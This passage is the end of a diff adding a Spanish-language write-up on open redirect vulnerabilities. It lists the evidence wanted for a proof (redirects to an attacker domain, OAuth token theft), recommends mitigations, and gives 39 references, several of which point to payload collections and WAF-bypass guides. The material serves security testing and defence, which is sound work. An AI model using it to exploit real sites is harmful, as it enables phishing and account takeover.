+- Screenshots de redirección exitosa a dominio atacante
+- Análisis de cabeceras HTTP mostrando Location malicioso
+- Logs de servidor atacante recibiendo víctimas redirigidas
+- Demostración de impacto real (OAuth token theft, phishing success)
+
+### Mitigación Recomendada
+
+Implementar validación estricta con whitelist de destinos permitidos, usar identificadores en lugar de URLs completas, normalizar y validar URLs antes de redirección, y implementar controles específicos para flujos OAuth/SSO.
+
+
+[^1]: https://www.intigriti.com/researchers/blog/hacking-tools/open-url-redirects-a-complete-guide-to-exploiting-open-url-redirect-vulnerabilities
+    
+[^2]: https://www.stackhawk.com/blog/what-is-open-redirect/
+    
+[^3]: https://www.diverto.hr/en/blog/2024-12-30-open-redirection-url-filter-bypasses
+    
+[^4]: https://www.wallarm.com/what/open-redirect-vulnerability
+    
+[^5]: https://infosecwriteups.com/how-to-automate-hunting-for-open-redirect-46537cd67b35
+    
+[^6]: https://spyboy.blog/2025/05/01/the-ultimate-guide-to-finding-open-redirect-vulnerabilities-step-by-step-payloads-tools/
+    
+[^7]: https://infosecwriteups.com/100-worth-open-redirect-automation-3e2f9e36bade
+    
+[^8]: https://www.cyberark.com/resources/threat-research-blog/how-secure-is-your-oauth-insights-from-100-websites
+    
+[^9]: https://systemweakness.com/day-21-full-account-takeover-via-open-redirection-5f3ca7f0c726
+    
+[^10]: https://infosecwriteups.com/️-how-hackers-bypass-web-application-firewalls-wafs-in-2025-c2a5052044c9
+    
+[^11]: https://systemweakness.com/8-sneaky-waf-bypass-attempts-hackers-use-in-2025-and-how-safeline-stops-them-cold-f00034239538
+    
+[^12]: https://gist.github.com/0xblackbird/d7677a05ea50586cf2be0a601e665d1a
+    
+[^13]: https://infosecwriteups.com/testing-and-bypassing-technique-for-open-redirection-vulnerability-ca1bc6c851c5
+    
+[^14]: https://www.youtube.com/watch?v=sOrS69P-D8M
+    
+[^15]: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
+    
+[^16]: https://github.com/0xKayala/OpenRedirector
+    
+[^17]: https://cqr.company/web-vulnerabilities/open-redirect/
+    
+[^18]: https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-24735
+    
+[^19]: https://pentest-tools.com/vulnerabilities-exploits/grafana-xss-open-redirect-ssrf-via-client-path-traversal_27130
+    
+[^20]: https://security.snyk.io/vuln/SNYK-RHEL10-AUTOMATIONCONTROLLER-10441889
+    
+[^21]: https://swisskyrepo.github.io/PayloadsAllTheThings/Open Redirect/
+    
+[^22]: https://www.invicti.com/blog/web-security/open-redirection-vulnerability-information-prevention/
+    
+[^23]: https://www.acunetix.com/vulnerabilities/web/grafana-open-redirect-cve-2025-4123/
+    
+[^24]: https://abnormal.ai/blog/attackers-exploit-open-redirects
+    
+[^25]: https://www.first.org/cvss/examples
+    
+[^26]: https://www.first.org/cvss/v3-1/examples
+    
+[^27]: https://cybercx.co.nz/blog/advanced-open-redirection-vulnerability-discovery/
+    
+[^28]: https://security.snyk.io/vuln/SNYK-JS-EXPRESS-6474509
+    
+[^29]: https://waf-bypass.com/2025/06/page/2/
+    
+[^30]: https://www.youtube.com/watch?v=1Op_fPufvRI
+    
+[^31]: https://brightdata.com/blog/web-data/bypass-cloudflare
+    
+[^32]: https://www.radware.com/cyberpedia/application-security/server-side-request-forgery/
+    
+[^33]: https://dl.acm.org/doi/fullHtml/10.1145/3627106.3627140
+    
+[^34]: https://hackerone.com/reports/206591
+    
+[^35]: https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
+    
+[^36]: https://www.linkedin.com/posts/martinmarting_an-interesting-combo-ssrf-and-open-redirect-activity-7343680390290706433-lviV
+    
+[^37]: https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com
+    
+[^38]: https://infosecwriteups.com/from-open-redirect-to-internal-access-my-ssrf-exploit-story-10a736962f98
+    
+[^39]: https://security.tecno.com/SRC/blogdetail/330?lang=en_US
